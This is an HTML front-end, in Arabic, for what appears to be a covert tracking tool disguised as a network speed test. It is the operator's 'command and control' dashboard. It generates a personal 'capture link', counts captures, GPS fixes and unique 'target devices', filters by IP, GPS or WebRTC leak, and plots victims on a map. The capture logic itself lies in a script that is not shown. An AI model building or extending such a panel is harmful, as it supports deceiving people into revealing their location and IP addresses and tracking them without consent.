<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لوحة التحكم — منصة تشخيص الشبكة</title>
  <meta name="description" content="مركز القيادة والتحكم لمراقبة عمليات فحص الشبكة وتتبع المواقع الجغرافية.">
  <meta name="theme-color" content="#0b1110">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
  <link rel="stylesheet" href="style.css">
  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='18' fill='%230b1110'/%3E%3Ccircle cx='50' cy='50' r='25' fill='%2395f0c0'/%3E%3C/svg%3E">
</head>
<body>
  <div class="dashboard-shell">
    <aside class="sidebar" aria-label="لوحة التحكم">
      <header class="sidebar-header">
        <a class="brand" href="/" target="_blank" rel="noreferrer">
          <span class="brand-dot" aria-hidden="true"></span>
          <span>
            <strong>مقياس السرعة</strong>
            <small>مركز القيادة والتحكم</small>
          </span>
        </a>
        <span class="live-badge" id="liveBadge">مباشر</span>
        <button class="icon-btn logout-trigger" onclick="window.location.href='/api/logout'" title="خروج">
          <svg viewBox="0 0 24 24" aria-hidden="true" width="18" height="18" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
        </button>
      </header>

      <section class="stats-row">
        <article class="stat-card">
          <strong id="totalCaptures">0</strong>
          <span>إجمالي الالتقاط</span>
        </article>
        <article class="stat-card">
          <strong id="gpsCount">0</strong>
          <span>مواقع GPS</span>
        </article>
        <article class="stat-card">
          <strong id="deviceCount">0</strong>
          <span>أجهزة فريدة</span>
        </article>
      </section>

      <section class="link-display" id="linkDisplay">
        <div class="link-label">رابط الالتقاط المخصص</div>
        <div class="link-input-group">
          <input id="personalLinkInput" readonly value="جاري التوليد...">
          <button class="icon-btn" onclick="copyPersonalLink()" title="نسخ الرابط">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
          </button>
        </div>
      </section>

      <section class="controls-stack">
        <div class="search-field">
          <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
          <input id="searchInput" type="search" placeholder="بحث بالهوية، IP، المدينة، أو الجهاز">
        </div>

        <div class="control-grid">
          <label>
            <span>الفلترة</span>
            <select id="layerFilter">
              <option value="all">الكل</option>
              <option value="gps">GPS فقط</option>
              <option value="ip">IP فقط</option>
              <option value="webrtc">تسريب WebRTC</option>
              <option value="nogps">بدون موقع</option>
            </select>
          </label>
          <label>
            <span>الترتيب</span>
            <select id="sortSelect">
              <option value="newest">الأحدث أولاً</option>
              <option value="oldest">الأقدم أولاً</option>
              <option value="gps-accuracy">دقة GPS</option>
              <option value="visits">عدد الزيارات</option>
            </select>
          </label>
        </div>
      </section>

      <section class="view-toggle">
        <button class="toggle-btn active" type="button" data-view="devices">
          أجهزة الأهداف
        </button>
        <button class="toggle-btn" type="button" data-view="all">
          قائمة العمليات
        </button>
      </section>

      <section class="list-area" id="listArea"></section>

      <footer class="sidebar-footer">
        <span>v2.4.0 — نظام الاستخبارات الشبكية</span>
      </footer>
    </aside>

    <main class="main-map-area">
      <div id="map"></div>
      
      <div id="welcomeOverlay" class="welcome-overlay">
        <div class="welcome-content">
          <div class="pulse-dot big"></div>
          <h2>مركز القيادة والتحكم</h2>
          <p>بانتظار وصول بيانات حية من العقد النشطة...</p>
        </div>
      </div>

      <div id="activeCapturePanel" class="capture-info-overlay hidden">
        <!-- Dynamic content from script.js -->
      </div>
      
      <div class="map-controls">
        <button class="map-action-btn" id="refreshBtn" title="تحديث البيانات">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
        </button>
        <button class="map-action-btn" id="clearAllBtn" title="مسح كافة البيانات">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/><line x1="10" y1="11" x2="10" y2="17"/><line x1="14" y1="11" x2="14" y2="17"/></svg>
        </button>
      </div>
    </main>
  </div>

  <div class="toast-container" id="toastContainer"></div>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script src="script.js"></script>
</body>
</html>
